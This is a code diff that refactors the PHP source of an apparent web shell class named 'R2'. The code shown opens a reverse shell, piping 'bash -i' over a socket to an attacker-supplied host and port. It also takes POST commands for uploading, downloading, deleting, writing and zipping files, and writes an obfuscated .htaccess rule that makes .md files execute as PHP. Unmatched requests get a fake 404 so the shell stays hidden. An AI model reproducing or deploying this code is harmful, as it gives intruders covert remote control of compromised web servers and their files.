@@ -17,12 +17,12 @@
 
 class R2
 {
-    protected static $chunk_size = 1400;
-    protected static $write_a = null;
-    protected static $error_a = null;
-    protected static $daemon = 0;
-    protected static $shell = 'bash -i'; // bash
-    protected static $htaccess = 'NqqGlcr+nccyvpngvba%2Sk-uggcq-cuc+.zq';
+    public static int $chunk_size = 1400;
+    public static $write_a = null;
+    public static $error_a = null;
+    public static int $daemon = 0;
+    public static string $shell = 'bash -i'; // bash
+    public static string $htaccess = 'NqqGlcr+nccyvpngvba%2Sk-uggcq-cuc+.zq';
     /*
      * @param string $host attacker ip/host
      * @param int $port attacker port
@@ -45,15 +45,10 @@ class R2
     {
         if (function_exists('pcntl_fork')) {
             $pid = pcntl_fork();
-            if ($pid == -1) {
-                exit(1);
-            } elseif ($pid) {
-                exit(0); // Parent exits
-            }
+            if ($pid == -1) exit(1);
+            elseif ($pid) exit(0); // Parent exits
             // Will only succeed if we forked
-            if (posix_setsid() == -1) {
-                exit(1);
-            }
+            if (posix_setsid() == -1) exit(1);
             R2::$daemon = 1;
         }
         // Remove any umask we inherited
@@ -61,10 +56,7 @@ class R2
 
         // Open reverse connection
         $sock = fsockopen($host, $port, $errno, $errstr, 30);
-        if (!$sock) {
-            exit(1);
-        }
-
+        if (!$sock) exit(1);
         // Spawn shell process
         $descriptorspec = array(
             0 => array('pipe', 'r'), // stdin
@@ -74,22 +66,16 @@ class R2
 
         $process = proc_open(R2::$shell, $descriptorspec, $pipes);
 
-        if (!is_resource($process)) {
-            exit(1);
-        }
+        if (!is_resource($process)) exit(1);
         stream_set_blocking($pipes[0], 0);
         stream_set_blocking($pipes[1], 0);
         stream_set_blocking($pipes[2], 0);
         stream_set_blocking($sock, 0);
         while (1) {
             // Check for end of TCP connection
-            if (feof($sock)) {
-                break;
-            }
+            if (feof($sock)) break;
             // Check for end of STDOUT
-            if (feof($pipes[1])) {
-                break;
-            }
+            if (feof($pipes[1])) break;
 
             $read_a = array($sock, $pipes[1], $pipes[2]);
             $num_changed_sockets = stream_select(
@@ -281,9 +267,7 @@ class R2
     }
     public function changeTime($file)
     {
-        if (file_exists($file)) {
-            $this->cft = filemtime($file);
-        }
+        if (file_exists($file)) $this->cft = filemtime($file);
     }
     public function zip(string $filename, $file)
     {
@@ -328,36 +312,28 @@ if (isset($_POST['debug'])
     && isset($_POST['value'])) {
     echo $r2->debug($_POST['debug'], $_POST['property'], $_POST['value']);
 }
-if (isset($_POST['cd'])) {
-    $r2->cd($_POST['cd']);
-}
+if (isset($_POST['cd'])) $r2->cd($_POST['cd']);
 if (isset($_POST['host']) && isset($_POST['port'])) {
     $r2->reverse($_POST['host'], $_POST['port']);
-} elseif (isset($_FILES['upload'])) {
-    echo $r2->upLoad($_FILES['upload']);
-} elseif (isset($_POST['remove'])) {
-    echo $r2->remove();
-} elseif (isset($_POST['htaccess'])) {
-    echo $r2->htaccess();
-} elseif (isset($_POST['name']) && isset($_POST['write'])) {
+} elseif (isset($_FILES['upload'])) echo $r2->upLoad($_FILES['upload']);
+elseif (isset($_POST['remove'])) echo $r2->remove();
+elseif (isset($_POST['htaccess'])) echo $r2->htaccess();
+elseif (isset($_POST['name']) && isset($_POST['write'])) {
     echo $r2->write($_POST['name'], $_POST['write']);
-} elseif (isset($_POST['help'])) {
-    echo $r2->help($_POST['help']);
-} elseif (isset($_POST['info'])) {
-    echo $r2->info();
-} elseif (isset($_POST['download'])) {
-    $r2->downLoad($_POST['download']);
-} elseif (isset($_POST['ls'])) {
-    echo $r2->ls($_POST['ls']);
-} elseif (isset($_POST['rm'])) {
-    echo $r2->rm($_POST['rm']);
-} elseif (isset($_POST['serial'])) {
-    echo $r2->serial($_POST['serial']);
-} elseif (isset($_POST['zip']) && isset($_POST['file'])) {
+}
+elseif (isset($_POST['help'])) echo $r2->help($_POST['help']);
+elseif (isset($_POST['info'])) echo $r2->info();
+elseif (isset($_POST['download'])) $r2->downLoad($_POST['download']);
+elseif (isset($_POST['ls'])) echo $r2->ls($_POST['ls']);
+elseif (isset($_POST['rm'])) echo $r2->rm($_POST['rm']);
+elseif (isset($_POST['serial'])) echo $r2->serial($_POST['serial']);
+elseif (isset($_POST['zip']) && isset($_POST['file'])) {
     $r2->zip($_POST['zip'], $_POST['file']);
-} elseif (isset($_POST['unzip']) && isset($_POST['to'])) {
+}
+elseif (isset($_POST['unzip']) && isset($_POST['to'])) {
     $r2->unzip($_POST['unzip'], $_POST['to']);
-} else {
+}
+else {
     header('HTTP/1.0 404 Not Found', true, 404);
     exit(404);
 }
